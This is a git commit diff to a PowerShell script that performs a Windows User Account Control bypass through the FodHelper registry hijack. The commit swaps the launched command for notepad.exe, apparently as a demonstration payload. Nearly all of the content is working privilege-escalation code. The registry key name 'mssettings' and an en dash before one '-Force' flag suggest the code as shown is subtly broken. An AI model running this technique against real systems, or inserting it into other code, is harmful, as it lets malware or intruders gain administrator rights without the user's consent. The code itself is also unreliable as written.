162e282dfeb2c2b28aca02016ab2f37e1c26b5da
Matheus Alexandre <60984217+Xcatolin@users.noreply.github.com>
2022-10-22 12:59:46 -0300

    Update UAC-bypass.ps1

--- PowerShell/UAC-bypass.ps1
+++ PowerShell/UAC-bypass.ps1
@@ -1,5 +1,5 @@
 #User Account Control bypass leveraging FodHelper
 New-Item HKCU:\Software\Classes\mssettings\shell\open\command –Force
 New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name "DelegateExecute" -PropertyType String -Force
-New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name "(default)" -Value $b -Force
+New-ItemProperty -Path HKCU:\Software\Classes\mssettings\shell\open\command -Name "(default)" -Value (get-command notepad.exe).Path -Force
 C:\Windows\System32\fodhelper.exe
